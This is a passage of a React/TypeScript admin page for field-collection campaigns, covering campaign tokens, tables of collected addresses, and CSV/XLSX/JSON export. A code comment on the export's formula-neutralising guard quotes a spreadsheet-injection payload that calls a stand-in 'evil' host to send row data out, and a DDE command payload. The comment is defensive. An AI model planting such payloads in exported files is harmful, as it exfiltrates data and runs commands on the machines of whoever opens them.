import { Fragment, useCallback, useEffect, useMemo, useRef, useState } from 'react';
import * as XLSX from 'xlsx';
import {
  ClipboardList, RefreshCw, Plus, Ban, Copy, Check, Upload, Lock, Trash2,
  ChevronDown, ChevronRight, ChevronUp, X, Rows3, AlertTriangle, Eraser,
} from 'lucide-react';
import axiosClient from '../../api/axiosClient';
import SectionHeader from '../../components/ui/SectionHeader';
import ErrorBanner from '../../components/ui/ErrorBanner';
import { SkeletonCard } from '../../components/ui/Skeleton';
import ConfirmDialog from '../../components/ui/ConfirmDialog';
import {
  groupByDoor, compareProfiles, filterProfiles,
  NO_FILTERS, hasActiveFilters,
  type SortKey, type SortDir, type Filters,
} from '../../utils/collectedTable';
import { errorText } from '../../utils/errorText';
import {
  buildingTypeLabel, formatHours, workloadLabels,
} from '../../utils/addressProfile';
import type {
  CollectedProfile, CollectedWalkerDay, CollectedWalkerDayDetail,
  CollectionTokenCreated, CollectionTokenSummary,
} from '../../api/types';

/** A filter chip with the house dropdown (ADR-433).
 *
 *  WAS A NATIVE <select> styled as a chip, which failed on both counts the
 *  screenshot showed:
 *
 *   - The popup is drawn by the OS, so it ignored the app's border radius,
 *     card colour and shadow entirely, and looked nothing like the truck
 *     picker or the employee picker two pages away.
 *   - `Type any` ran together as one string, because a native select cannot be
 *     given a gap between the label and its own value — the label was a
 *     sibling <span> and the select's text started wherever the OS put it.
 *
 *  So this mirrors `ui/SelectMenu`: a bordered trigger and an overlaid panel,
 *  same border/card/shadow tokens, same outside-click and Escape handling,
 *  same role="listbox" / role="option" / aria-selected contract. SelectMenu
 *  itself is a full-width form control with a label above it; a filter chip is
 *  inline, compact and carries its own label, so this is the same language at
 *  a different size rather than a second opinion about how a dropdown looks.
 *
 *  The label and the value are now separated deliberately: the label is muted
 *  and the value is foreground-coloured, with real spacing between them, so
 *  "Type" reads as the field and "any" as its current setting.
 */
function ChipSelect({ label, value, options, onChange }: {
  label: string;
  value: string;
  options: { value: string; label: string }[];
  onChange: (v: string) => void;
}) {
  const [open, setOpen] = useState(false);
  const ref = useRef<HTMLDivElement>(null);
  const active = value !== '';
  const current = options.find((o) => o.value === value);

  // Same dismissal contract as SelectMenu. A panel that overlays other
  // controls and cannot be dismissed by clicking away is worse than the
  // native select it replaced, not better.
  useEffect(() => {
    if (!open) return;
    const onDown = (e: MouseEvent) => {
      if (ref.current && !ref.current.contains(e.target as Node)) setOpen(false);
    };
    const onKey = (e: KeyboardEvent) => { if (e.key === 'Escape') setOpen(false); };
    document.addEventListener('mousedown', onDown);
    document.addEventListener('keydown', onKey);
    return () => {
      document.removeEventListener('mousedown', onDown);
      document.removeEventListener('keydown', onKey);
    };
  }, [open]);

  const choose = (v: string) => { onChange(v); setOpen(false); };

  return (
    <div className="relative" ref={ref}>
      <button
        type="button"
        aria-haspopup="listbox"
        aria-expanded={open}
        aria-label={`Filter by ${label.toLowerCase()}`}
        onClick={() => setOpen((o) => !o)}
        className={`inline-flex items-center gap-2 rounded-full border px-3 py-1.5 text-xs shadow-sm transition-colors ${
          active
            ? 'border-primary bg-primary/10 text-primary'
            : 'border-input bg-background hover:border-primary'
        } focus:outline-none focus:ring-1 focus:ring-primary`}
      >
        {/* Label and value are separate elements with a gap and different
            weights — the fix for "Type any" reading as one word. */}
        <span className={active ? 'text-primary/70' : 'text-muted-foreground'}>{label}</span>
        <span className={`font-medium ${active ? '' : 'text-foreground'}`}>
          {current ? current.label : 'any'}
        </span>
        <ChevronDown
          aria-hidden="true"
          className={`h-3 w-3 shrink-0 transition-transform ${open ? 'rotate-180' : ''} ${
            active ? 'text-primary/70' : 'text-muted-foreground'
          }`}
        />
      </button>

      {open && (
        <div
          role="listbox"
          aria-label={label}
          className="absolute z-20 mt-1 min-w-full max-h-72 overflow-auto rounded-lg border border-border bg-card shadow-lg"
        >
          {/* "any" is an option in the list rather than a separate clear
              control: it is what the filter is SET TO when unset, so it
              belongs where the other values are. The bar's Clear button
              resets every chip at once, which is a different action. */}
          {[{ value: '', label: 'any' }, ...options].map((o) => (
            <button
              key={o.value || '__any'}
              type="button"
              role="option"
              aria-selected={o.value === value}
              onClick={() => choose(o.value)}
              className={`flex w-full items-center gap-2 whitespace-nowrap px-3 py-2 text-left text-xs hover:bg-accent/40 ${
                o.value === value ? 'bg-accent/60' : ''
              }`}
            >
              <Check
                aria-hidden="true"
                className={`h-3 w-3 shrink-0 ${o.value === value ? '' : 'invisible'}`}
              />
              <span className="truncate">{o.label}</span>
            </button>
          ))}
        </div>
      )}
    </div>
  );
}

/** One sortable column header (ADR-432 D3).
 *
 *  Exists as a component so the ARIA contract is written ONCE. Four inline
 *  copies would be four chances to put aria-sort on the button instead of the
 *  th, or to leave it set on two columns at once — both of which are silent
 *  failures that only a screen reader reveals.
 */
function SortableTh({ label, col, sortKey, sortDir, onSort }: {
  label: string;
  col: SortKey;
  sortKey: SortKey;
  sortDir: SortDir;
  onSort: (k: SortKey) => void;
}) {
  const active = sortKey === col;
  return (
    <th
      className="py-2 pr-3 font-semibold"
      // Only the ACTIVE column may carry this. Undefined removes the attribute
      // entirely rather than rendering aria-sort="none" on every other column.
      aria-sort={active ? (sortDir === 'asc' ? 'ascending' : 'descending') : undefined}
    >
      <button
        type="button"
        onClick={() => onSort(col)}
        className="inline-flex items-center gap-1 uppercase tracking-wide transition-colors hover:text-foreground focus:outline-none focus:ring-2 focus:ring-primary/40 rounded"
      >
        {label}
        {/* aria-hidden: the direction is already announced via aria-sort, and
            a chevron inside the button would otherwise be read as part of its
            name. An inactive column keeps a dimmed chevron so the control
            reads as sortable before it is used. */}
        <span aria-hidden="true" className={active ? '' : 'opacity-30'}>
          {active && sortDir === 'asc'
            ? <ChevronUp className="h-3 w-3" />
            : <ChevronDown className="h-3 w-3" />}
        </span>
      </button>
    </th>
  );
}

/**
 * What came back from the public collection page (ADR-415 D6).
 *
 * ADR-415 built the submit endpoint and the tables; nothing could read them.
 * That is the same shape as ADR-340's incident — detection improved and the
 * noticing did not — so this is the reader.
 *
 * SUPER ADMIN ONLY, not platform staff. The rows are customer delivery
 * addresses, and ADR-343 D4 forbids any `platform_support` endpoint from
 * returning addresses: that login is cross-tenant, so PII behind it becomes a
 * cross-tenant PII surface. The gate is enforced server-side; this page simply
 * lives where only a super admin can reach it.
 *
 * Read plus issue/revoke, and no promotion. Nothing here moves a row into
 * `building_profiles` — the data is collected to be looked at, so the
 * quarantine table is the destination rather than a staging area (ADR-415 D6).
 */

const fmt = (iso: string | null): string => {
  if (!iso) return '—';
  const d = new Date(iso);
  return `${d.toLocaleDateString()} ${d.toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' })}`;
};

/** CSV escape: quote always, double interior quotes. Addresses carry commas and
 *  notes carry everything. */
/** Neutralises a spreadsheet formula before it reaches a cell (ADR-435).
 *
 *  THE EXPORT IS THE ATTACK PATH THIS SYSTEM ACTUALLY HAS. Collected text comes
 *  from a public link that anyone holding the URL can post to, and the one place
 *  it lands in something that INTERPRETS it is a spreadsheet: a `note` or a
 *  `collected_by` of `=HYPERLINK("http://evil/?x="&A1,"Click")` exfiltrates the
 *  row when the admin opens the file, and `+cmd|'/c calc'!A1` is the DDE
 *  variant. React escapes the table, SQLAlchemy parameterises the query — Excel
 *  does neither.
 *
 *  Prefixing with an apostrophe is OWASP's recommendation: the cell renders as
 *  typed and is never evaluated. The character set is OWASP's current one and is
 *  wider than the familiar four — tab, CR and LF are included because a leading
 *  whitespace control character still reaches the formula parser.
 *
 *  Applied to VALUES, not to the whole line, so it runs before the CSV quoting
 *  and before the xlsx writer, which share this helper precisely so the two
 *  formats cannot drift apart on a security control.
 */
function deFormula(v: unknown): string {
  const s = String(v ?? '');
  return /^[=+\-@\t\r\n]/.test(s) ? `'${s}` : s;
}

const q = (v: unknown): string => `"${deFormula(v).replace(/"/g, '""')}"`;

/** ADR-429: the EXPORT keeps stored values, deliberately.
 *
 *  The table humanises `loading_dock_mailroom` to "Loading dock: mailroom"
 *  because a person reads it. A CSV is read by a loader, and these column names
 *  already match `BuildingProfile` so a later import maps straight across —
 *  translating them would mean translating them back.
 *
 *  Display formats for people, wire formats for machines, and the same file
 *  cannot be both. */
const CSV_COLUMNS = [
  'normalised_address', 'building_category', 'building_type',
  'has_security_desk', 'workloads', 'workload_other', 'workload_class',
  'raw_note', 'opens_at', 'closes_at', 'break_start', 'break_end',
  'troublesome', 'collected_by', 'collected_on', 'submitted_at',
] as const;

/** One profile as a row, in CSV_COLUMNS order.
 *
 *  Column names match `BuildingProfile` so a later load maps straight across
 *  without a translation table. Extracted from `toCSV` so the CSV and the
 *  workbook are literally the same data rather than two lists that agree
 *  today. */
function profileRow(r: CollectedProfile): unknown[] {
  return [
    r.address, r.building_category, r.building_type,
    r.has_security_desk ? 'true' : 'false',
    // Pipe-separated, matching every other place workloads are written: a
    // comma inside a CSV cell survives the file and trips naive splitters.
    (r.workloads ?? []).join('|'), r.workload_other ?? '',
    r.workload_class, r.note ?? '',
    r.opens_at ?? '', r.closes_at ?? '', r.break_start ?? '', r.break_end ?? '',
    r.troublesome ? 'true' : 'false',
    r.collected_by ?? '', r.collected_on, r.submitted_at,
  ];
}

function toCSV(rows: CollectedProfile[]): string {
  return [
    CSV_COLUMNS.join(','),
    ...rows.map((r) => profileRow(r).map(q).join(',')),
  ].join('\n');
}

/** One row per ADDRESS on a route, not one per day.
 *
 *  The grain is deliberate: the comparison this data exists for is
 *  "which walker carried which address", so a row per day would need unpacking
 *  before it could be compared against the sort output. Day-level facts repeat
 *  down the rows, which is what makes the file joinable.
 */
const DAY_COLUMNS = [
  'walker_name', 'collected_on', 'arrival_time', 'departure_time',
  'route_id', 'route_start', 'route_end', 'difficulty',
  'bag_id', 'address', 'sort_zone', 'stop',
  'rts_count', 'ov_count', 'revision', 'submitted_at',
] as const;

/** Every day flattened to one row per address, in DAY_COLUMNS order. */
function dayRows(rows: CollectedWalkerDayDetail[]): unknown[][] {
  const out: unknown[][] = [];
  for (const d of rows) {
    for (const r of d.payload.routes ?? []) {
      const rts = r.rts?.length ?? 0;
      const ovs = r.ovs?.length ?? 0;
      // A route with no totes still gets a row: it happened, and dropping it
      // would make the route count in this file disagree with the listing.
      const totes = r.totes?.length ? r.totes : [{ bag_id: '', addresses: [] as string[] }];
      for (const t of totes) {
        const addrs = t.addresses?.length ? t.addresses : [''];
        for (const a of addrs) {
          out.push([
            d.walker_name, d.collected_on, d.arrival_time ?? '', d.departure_time ?? '',
            r.route_id, r.route_start, r.route_end, r.difficulty,
            t.bag_id, a,
            ('sort_zone' in t ? t.sort_zone : '') ?? '', ('stop' in t ? t.stop : '') ?? '',
            rts, ovs, d.revision, d.submitted_at,
          ]);
        }
      }
    }
  }
  return out;
}

function daysToCSV(rows: CollectedWalkerDayDetail[]): string {
  return [
    DAY_COLUMNS.join(','),
    ...dayRows(rows).map((r) => r.map(q).join(',')),
  ].join('\n');
}

/** Turns a header and rows into a one-sheet workbook.
 *
 *  Shared by both datasets so the xlsx and the CSV cannot drift: each caller
 *  passes the SAME column list and the SAME row builder it gives `toCSV`, and
 *  only the container differs.
 */
function sheetBlob(name: string, header: readonly string[], rows: unknown[][]): Blob {
  // ADR-435. The xlsx path does NOT go through `q()` — aoa_to_sheet writes the
  // strings it is given — so the same escaping is applied here explicitly.
  // Missing this would have left the more dangerous of the two formats
  // unprotected while the CSV looked fixed: Excel opens .xlsx without any of
  // the "this is a text file" friction that sometimes saves a CSV.
  const safe = rows.map((r) => r.map(deFormula));
  const ws = XLSX.utils.aoa_to_sheet([[...header], ...safe]);
  ws['!cols'] = header.map((h) => ({ wch: Math.max(12, Math.min(40, h.length + 6)) }));
  if (rows.length > 0) {
    ws['!autofilter'] = {
      ref: XLSX.utils.encode_range({
        s: { r: 0, c: 0 }, e: { r: rows.length, c: header.length - 1 },
      }),
    };
  }
  const wb = XLSX.utils.book_new();
  XLSX.utils.book_append_sheet(wb, ws, name);
  const out = XLSX.write(wb, { bookType: 'xlsx', type: 'array' }) as ArrayBuffer;
  return new Blob([out], {
    type: 'application/vnd.openxmlformats-officedocument.spreadsheetml.sheet',
  });
}

export default function CollectionData({ platform = true }: {
  /** Whose view this is (ADR-423).
   *
   *  ONE component for both, because the endpoints already scope themselves:
   *  a super admin's reads return everything, a company admin's return only
   *  their own company's rows, and create_token decides the scope from the
   *  caller. Duplicating the page would duplicate the campaign list, the
   *  drill-down, three export formats and the token controls in order to change
   *  a heading — and the duplicate would drift.
   *
   *  What this flag changes is only what the page SAYS, not what it can do.
   *  The gate is server-side; this is copy. */
  platform?: boolean;
}) {
  const [tokens, setTokens] = useState<CollectionTokenSummary[]>([]);
  const [profiles, setProfiles] = useState<CollectedProfile[]>([]);
  const [activeToken, setActiveToken] = useState<string | null>(null);
  /** Which dataset is on screen. The two campaigns collect different things —
   *  addresses describe a door, days describe a shift — so they get two views
   *  rather than one merged table whose columns are half empty either way. */
  const [dataset, setDataset] = useState<'addresses' | 'days'>('addresses');
  const [days, setDays] = useState<CollectedWalkerDay[]>([]);
  /** The expanded day, fetched on demand. The listing carries counts only. */
  const [openDay, setOpenDay] = useState<CollectedWalkerDayDetail | null>(null);
  const [loading, setLoading] = useState(true);
  const [loadingRows, setLoadingRows] = useState(false);
  const [error, setError] = useState('');

  // The freshly-created secret. Held in component state ONLY, never refetched:
  // the backend returns it once, so once this page is left it is unrecoverable
  // and a new campaign must be issued.
  const [copied, setCopied] = useState(false);
  const [creating, setCreating] = useState(false);
  const [label, setLabel] = useState('');
  // Both are enforced server-side and were unreachable from any client until
  // these existed — the ADR-381 shape: a live backend capability with no
  // surface. `expiresInDays` empty means no expiry, which is the schema's own
  // default (Optional, None).
  const [dailyCap, setDailyCap] = useState('500');
  const [expiresInDays, setExpiresInDays] = useState('');

  const loadTokens = useCallback(async () => {
    setLoading(true);
    try {
      const { data } = await axiosClient.get<CollectionTokenSummary[]>('/collection/tokens');
      setTokens(data);
      setError('');
    } catch (e) {
      setError(errorText(e, 'Could not load collection campaigns.'));
    } finally {
      setLoading(false);
    }
  }, []);

  const loadProfiles = useCallback(async (tokenId: string | null) => {
    setLoadingRows(true);
    try {
      const { data } = await axiosClient.get<CollectedProfile[]>('/collection/profiles', {
        params: tokenId ? { token_id: tokenId, limit: 1000 } : { limit: 1000 },
      });
      setProfiles(data);
      setError('');
    } catch (e) {
      setError(errorText(e, 'Could not load collected addresses.'));
    } finally {
      setLoadingRows(false);
    }
  }, []);

  const loadDays = useCallback(async (tokenId: string | null) => {
    setLoadingRows(true);
    try {
      const { data } = await axiosClient.get<CollectedWalkerDay[]>('/collection/walker-days', {
        params: tokenId ? { token_id: tokenId, limit: 1000 } : { limit: 1000 },
      });
      setDays(data);
      setError('');
    } catch (e) {
      setError(errorText(e, 'Could not load collected days.'));
    } finally {
      setLoadingRows(false);
    }
  }, []);

  /** One day in full. Fetched on expand rather than with the listing: forty
   *  days with every tote and address inline is a large response for a table
   *  that only shows counts. */
  const expandDay = useCallback(async (id: string) => {
    if (openDay?.id === id) { setOpenDay(null); return; }
    try {
      const { data } = await axiosClient.get<CollectedWalkerDayDetail>(
        `/collection/walker-days/${id}`);
      setOpenDay(data);
      setError('');
    } catch (e) {
      setError(errorText(e, 'Could not load that day.'));
    }
  }, [openDay]);

  useEffect(() => { void loadTokens(); }, [loadTokens]);
  useEffect(() => {
    // Only the visible dataset is fetched. Loading both on every campaign
    // click would double the traffic to show one table.
    if (dataset === 'addresses') void loadProfiles(activeToken);
    else void loadDays(activeToken);
  }, [activeToken, dataset, loadProfiles, loadDays]);

  const createToken = async () => {
    if (!label.trim()) { setError('Give the campaign a name first.'); return; }
    setCreating(true);
    try {
      const cap = Number(dailyCap);
      if (!Number.isInteger(cap) || cap < 1 || cap > 5000) {
        setError('Daily cap must be a whole number between 1 and 5000.');
        setCreating(false);
        return;
      }
      const days = expiresInDays.trim() === '' ? null : Number(expiresInDays);
      if (days !== null && (!Number.isInteger(days) || days < 1 || days > 365)) {
        setError('Expiry must be a whole number of days between 1 and 365.');
        setCreating(false);
        return;
      }
      const { data } = await axiosClient.post<CollectionTokenCreated>('/collection/tokens', {
        label: label.trim(),
        daily_cap: cap,
        // Omitted entirely rather than sent as null: the schema is extra="forbid"
        // and treats an absent key as "no expiry".
        ...(days !== null ? { expires_in_days: days } : {}),
      });
      // SELECT the new campaign rather than holding its token in state. The
      // link then appears on its own row in the sidebar — same "copy it now"
      // moment the old banner gave, attached to the campaign it belongs to and
      // still there tomorrow (ADR-424).
      setLabel('');
      setExpiresInDays('');
      await loadTokens();
      setActiveToken(data.id);
      setError('');
    } catch (e) {
      setError(errorText(e, 'Could not create the collection link.'));
    } finally {
      setCreating(false);
    }
  };

  const revoke = async (t: CollectionTokenSummary) => {
    if (!window.confirm(`Revoke "${t.label}"? Submissions stop immediately.`)) return;
    try {
      await axiosClient.post(`/collection/tokens/${t.id}/revoke`);
      await loadTokens();
      setError('');
    } catch (e) {
      setError(errorText(e, 'Could not revoke that link.'));
    }
  };

  /** The row queued for deletion, or null. ADR-431.
   *
   *  Holding the ROW rather than an id so the dialog can name the address.
   *  That is the whole safety mechanism here: the realistic mistake is
   *  deleting the wrong row, and only the address catches it. */
  // ADR-432. View state for the address table: how it is ordered, what is
  // hidden, and whether rows are collapsed into doors.
  const [sortKey, setSortKey] = useState<SortKey>('collected_on');
  const [sortDir, setSortDir] = useState<SortDir>('desc');
  const [filters, setFilters] = useState<Filters>(NO_FILTERS);
  const [grouped, setGrouped] = useState(false);
  const [openDoor, setOpenDoor] = useState<string | null>(null);

  const [toDelete, setToDelete] = useState<CollectedProfile | null>(null);
  const [deleting, setDeleting] = useState(false);

  /** The campaign queued for cleanup, and which of the two actions. ADR-437. */
  const [cleanup, setCleanup] = useState<
    { token: CollectionTokenSummary; mode: 'purge' | 'delete' } | null
  >(null);
  /** What the admin has typed to confirm. ADR-437 D4 — a typed confirmation is
   *  warranted HERE where ADR-431 rejected it for a single row: this destroys
   *  weeks of field work that cannot be re-walked, it happens a handful of
   *  times ever, and the blast radius is every row rather than one. */
  const [cleanupTyped, setCleanupTyped] = useState('');

  const closeCleanup = useCallback(() => {
    setCleanup(null);
    setCleanupTyped('');
  }, []);

  /** Escape closes the cleanup dialog, and focus lands inside it on open.
   *
   *  ConfirmDialog guarantees this for every other confirm on the page; this
   *  one is hand-rolled (it needs a typed input, which that component cannot
   *  host), so the guarantees have to be restated rather than inherited.
   *  Without them a keyboard user is trapped in a modal that destroys a
   *  campaign — the exact failure ConfirmDialog was written to prevent.
   *
   *  Focus goes to the TEXT INPUT, not the confirm button: the input is what
   *  the dialog is asking for, and the destructive button is disabled until it
   *  is filled in anyway. */
  const cleanupInputRef = useRef<HTMLInputElement>(null);
  useEffect(() => {
    if (!cleanup) return;
    const onKey = (e: KeyboardEvent) => { if (e.key === 'Escape') closeCleanup(); };
    document.addEventListener('keydown', onKey);
    cleanupInputRef.current?.focus();
    return () => document.removeEventListener('keydown', onKey);
  }, [cleanup, closeCleanup]);

  /** Empties a campaign, or removes it entirely (ADR-437).
   *
   *  Both are gated server-side on the link being revoked, so the control only
   *  appears on a revoked campaign — offering one that would 409 is worse than
   *  not offering it.
   */
  const runCleanup = async () => {
    if (!cleanup) return;
    setDeleting(true);
    try {
      const { token, mode } = cleanup;
      await axiosClient.delete(
        mode === 'purge'
          ? `/collection/tokens/${token.id}/data`
          : `/collection/tokens/${token.id}`,
      );
      setCleanup(null);
      setCleanupTyped('');
      // A deleted campaign cannot stay selected, and a purged one now holds
      // nothing — either way both lists have to be re-read.
      if (mode === 'delete' && activeToken === token.id) setActiveToken(null);
      await loadTokens();
      await loadProfiles(mode === 'delete' ? null : activeToken);
      setError('');
    } catch (e) {
      setError(errorText(e, 'Could not clean up that campaign.'));
      setCleanup(null);
      setCleanupTyped('');
    } finally {
      setDeleting(false);
    }
  };

  /** The device whose rows are queued for bulk removal, or null. ADR-435. */
  const [purgeDevice, setPurgeDevice] = useState<{ device: string; rows: number } | null>(null);

  /** Removes every row one device sent to the selected campaign (ADR-435).
   *
   *  THE CLEANUP PATH FOR AN ABUSED LINK. The collection link is public by
   *  design, so the realistic incident is a flood of junk, and ADR-431's
   *  per-row delete would mean clicking until the campaign ends.
   *
   *  Only offered when ONE campaign is selected. Against "All campaigns" the
   *  button would read as "remove this spammer everywhere" while the endpoint
   *  is deliberately per-campaign, and a destructive control that does less
   *  than it appears to is worse than no control.
   */
  const confirmPurge = async () => {
    if (!purgeDevice || !activeToken) return;
    setDeleting(true);
    try {
      await axiosClient.delete<{ deleted: number }>(
        '/collection/profiles',
        { params: { token_id: activeToken, device_id: purgeDevice.device } },
      );
      setPurgeDevice(null);
      // The reloaded table IS the confirmation — the rows are visibly gone and
      // the progress line re-counts. A success banner for one action would be
      // the page's only one, and a banner nobody else uses reads as an error.
      await loadProfiles(activeToken);
      setError('');
    } catch (e) {
      setError(errorText(e, 'Could not remove those rows.'));
      setPurgeDevice(null);
    } finally {
      setDeleting(false);
    }
  };

  /** Remove one observation, permanently (ADR-431 D2).
   *
   *  No optimistic removal and no undo toast, which is the usual modern
   *  default: there is nothing to roll back to. The row is gone server-side
   *  before the list reloads, so showing it as gone early would only
   *  mis-report a failure. The refetch is the confirmation. */
  const confirmDelete = async () => {
    if (!toDelete) return;
    setDeleting(true);
    try {
      await axiosClient.delete(`/collection/profiles/${toDelete.id}`);
      setToDelete(null);
      // Reload the CURRENT campaign, not all of them: loadProfiles(null)
      // silently widens the table to every campaign after a delete.
      await loadProfiles(activeToken);
      setError('');
    } catch (e) {
      setError(errorText(e, 'Could not delete that address.'));
      setToDelete(null);
    } finally {
      setDeleting(false);
    }
  };

  /** ADR-432 D4. The listing asks for 1000 rows; if it came back full, there
   *  are probably more, and every aggregate below is computed over a SUBSET.
   *  Said out loud rather than hidden — this is the exact shape of the bug
   *  ADR-430 shipped, where a client-side count was right only until a door's
   *  observations straddled a page boundary. */
  const atFetchLimit = profiles.length >= 1000;

  /** Filter first, then sort. The other order costs a sort of rows that are
   *  about to be discarded, and for the `differs` filter it would be wrong as
   *  well as wasteful: that filter is resolved against the door grouping, which
   *  sorting does not affect but re-deriving would recompute. */
  const visible = useMemo(() => {
    const kept = filterProfiles(profiles, filters);
    return [...kept].sort((a, b) => compareProfiles(a, b, sortKey, sortDir));
  }, [profiles, filters, sortKey, sortDir]);

  const doors = useMemo(() => (grouped ? groupByDoor(visible) : []), [grouped, visible]);

  /** Campaign progress (ADR-433). "1 address collected" is a COUNT, not
   *  progress — it cannot tell you whether a 30-day survey is on track.
   *
   *  Derived from every fetched row, not from `visible`: progress is a property
   *  of the campaign, and a filtered view must not make it look like the
   *  campaign shrank. That is the same trap as the headline count, in the
   *  opposite direction — there the number must follow the filter, here it must
   *  ignore it, because one describes the table and the other the survey.
   */
  const progress = useMemo(() => {
    const all = groupByDoor(profiles);
    return {
      doors: all.length,
      verified: all.filter((d) => d.state !== 'single').length,
      conflicts: all.filter((d) => d.state === 'differs').length,
      collectors: new Set(profiles.map((p) => p.collected_by).filter(Boolean)).size,
    };
  }, [profiles]);

  /** Options come from the DATA, not from the taxonomy: a type nobody has
   *  collected is a filter that can only return nothing, and listing all
   *  fifteen makes the two that matter harder to find. */
  const typeOptions = useMemo(
    () => [...new Set(profiles.map((p) => p.building_type))].sort(),
    [profiles],
  );
  const workloadOptions = useMemo(
    () => [...new Set(profiles.flatMap((p) => p.workloads ?? []))].sort(),
    [profiles],
  );

  /** Moving the sort. First click on a new column sorts it ascending; clicking
   *  the active column flips it. Resetting to ascending on a NEW column matters
   *  — carrying the previous column's direction over makes the first click on
   *  a column land on an order the reader did not ask for. */
  const toggleSort = (k: SortKey) => {
    if (k === sortKey) setSortDir((d) => (d === 'asc' ? 'desc' : 'asc'));
    else { setSortKey(k); setSortDir('asc'); }
  };

  /** Bundled so each SortableTh spreads one prop rather than repeating three,
   *  which is where a copy-paste would forget to update `col`. */
  const sortProps = { sortKey, sortDir, onSort: (k: SortKey) => toggleSort(k) };

  /** Hands the bytes to the browser. Takes a Blob rather than a string so the
   *  same path serves text formats and the xlsx binary. */
  const save = (name: string, ext: string, blob: Blob) => {
    const url = URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url;
    a.download = `${name}-${new Date().toISOString().slice(0, 10)}.${ext}`;
    a.click();
    setTimeout(() => URL.revokeObjectURL(url), 0);
  };

  const text = (body: string, type: string) => new Blob([body], { type });

  const [downloading, setDownloading] = useState(false);

  /** THE export surface for collected data.
   *
   *  The collection pages have none: their data goes to the server, and a
   *  second copy leaving on a collector's phone would be the record without
   *  the access control. Everything anyone needs to take away is taken from
   *  here, behind the super-admin gate.
   *
   *  Three formats for each dataset, carrying the same rows and columns — only
   *  the container differs, so a recipient given one file is not given less
   *  than a recipient given another. */
  const download = async (fmt: 'csv' | 'json' | 'xlsx') => {
    if (dataset === 'addresses') {
      if (fmt === 'xlsx') {
        save('collected-addresses', 'xlsx', sheetBlob('Address profiles', CSV_COLUMNS, profiles.map(profileRow)));
      } else if (fmt === 'json') {
        save('collected-addresses', 'json',
          text(JSON.stringify({ profiles }, null, 2), 'application/json'));
      } else {
        save('collected-addresses', 'csv', text(toCSV(profiles), 'text/csv'));
      }
      return;
    }
    // The day export is one row per ADDRESS, so it needs every payload — and
    // the listing deliberately carries none. Fetched here, on an explicit
    // export, rather than eagerly on every page load: this is the one moment
    // the cost buys something.
    setDownloading(true);
    try {
      const full = await Promise.all(days.map((d) =>
        axiosClient.get<CollectedWalkerDayDetail>(`/collection/walker-days/${d.id}`)
          .then((r) => r.data)));
      if (fmt === 'xlsx') {
        save('collected-walker-days', 'xlsx', sheetBlob('Walker days', DAY_COLUMNS, dayRows(full)));
      } else if (fmt === 'json') {
        save('collected-walker-days', 'json',
          text(JSON.stringify({ days: full }, null, 2), 'application/json'));
      } else {
        save('collected-walker-days', 'csv', text(daysToCSV(full), 'text/csv'));
      }
      setError('');
    } catch (e) {
      setError(errorText(e, 'Could not build the day export.'));
    } finally {
      setDownloading(false);
    }
  };

  /** The selected campaign, or null on "All campaigns". Carries the link, so
   *  the row below can show it (ADR-424). */
  const selected = useMemo(
    () => tokens.find((t) => t.id === activeToken) ?? null,
    [tokens, activeToken],
  );
  const activeLabel = selected?.label;


  return (
    <div className="space-y-6">
      <SectionHeader
        eyebrow={platform ? 'Platform' : 'Survey'}
        title={platform ? 'Collected addresses' : 'Building survey'}
        description={platform
          ? 'Building profiles and logged days from every campaign, open and company. Read-only; nothing here changes routing.'
          : 'Building profiles your staff have collected. A link you issue here works only for signed-in employees of your company.'}
        actions={
          <button
            onClick={() => { void loadTokens(); void loadProfiles(activeToken); }}
            className="btn-secondary text-sm inline-flex items-center gap-1.5"
          >
            <RefreshCw className="w-4 h-4" /> Refresh
          </button>
        }
      />

      <ErrorBanner message={error || null} />

      {/* The secret, shown once. Deliberately loud: leaving this page loses it,
          and the only recovery is issuing a new campaign. */}
      {/* ADR-424. NO floating "copy it now" banner.
          
          It sat at the top of the page, detached from the campaign it belonged
          to — with one campaign in the list it read as a page-level notice
          rather than THAT campaign's link, and with several it would have been
          ambiguous. The link now lives on its own row, where it is
          unambiguous and can be re-copied any time. */}

      <div className="grid gap-6 lg:grid-cols-[340px_minmax(0,1fr)] items-start [&>*]:min-w-0">
        {/* ── Campaigns ────────────────────────────────────────────────── */}
        <aside className="card p-4 space-y-3">
          <h2 className="text-sm font-semibold inline-flex items-center gap-1.5">
            <ClipboardList className="w-4 h-4" /> Campaigns
          </h2>

          <div className="flex gap-2">
            <input
              value={label}
              onChange={(e) => setLabel(e.target.value)}
              onKeyDown={(e) => { if (e.key === 'Enter') void createToken(); }}
              placeholder="New campaign name"
              className="w-full rounded-lg border border-border bg-surface px-3 py-2 text-sm focus:outline-none focus:ring-2 focus:ring-primary/40"
            />
            <button
              onClick={() => void createToken()}
              disabled={creating || !label.trim()}
              className="btn-primary shrink-0 px-3 disabled:opacity-40"
              title="Issue a collection link"
            >
              <Plus className="w-4 h-4" />
            </button>
          </div>

          <div className="grid grid-cols-2 gap-2">
            <label className="block">
              <span className="block text-[11px] text-muted-foreground">Daily cap</span>
              <input
                type="number" min={1} max={5000} inputMode="numeric"
                value={dailyCap}
                onChange={(e) => setDailyCap(e.target.value)}
                className="mt-0.5 w-full rounded-lg border border-border bg-surface px-2 py-1.5 text-sm focus:outline-none focus:ring-2 focus:ring-primary/40"
              />
            </label>
            <label className="block">
              <span className="block text-[11px] text-muted-foreground">Expires (days)</span>
              <input
                type="number" min={1} max={365} inputMode="numeric"
                value={expiresInDays}
                onChange={(e) => setExpiresInDays(e.target.value)}
                placeholder="never"
                className="mt-0.5 w-full rounded-lg border border-border bg-surface px-2 py-1.5 text-sm focus:outline-none focus:ring-2 focus:ring-primary/40"
              />
            </label>
          </div>

          {loading ? (
            <SkeletonCard />
          ) : tokens.length === 0 ? (
            <p className="text-sm text-muted-foreground">
              No campaigns yet. Name one above to get a collection link.
            </p>
          ) : (
            <ul className="space-y-1">
              <li>
                <button
                  onClick={() => setActiveToken(null)}
                  className={`w-full rounded-lg px-2 py-1.5 text-left text-sm ${
                    activeToken === null ? 'bg-muted font-medium' : 'hover:bg-muted'
                  }`}
                >
                  All campaigns
                </button>
              </li>
              {tokens.map((t) => {
                const dead = t.revoked_at !== null;
                return (
                  <li key={t.id} className="group flex items-center gap-1">
                    <button
                      onClick={() => setActiveToken(t.id)}
                      className={`min-w-0 flex-1 rounded-lg px-2 py-1.5 text-left text-sm ${
                        activeToken === t.id ? 'bg-muted font-medium' : 'hover:bg-muted'
                      }`}
                    >
                      <span className={`block truncate ${dead ? 'line-through opacity-60' : ''}`}>
                        {t.label}
                      </span>
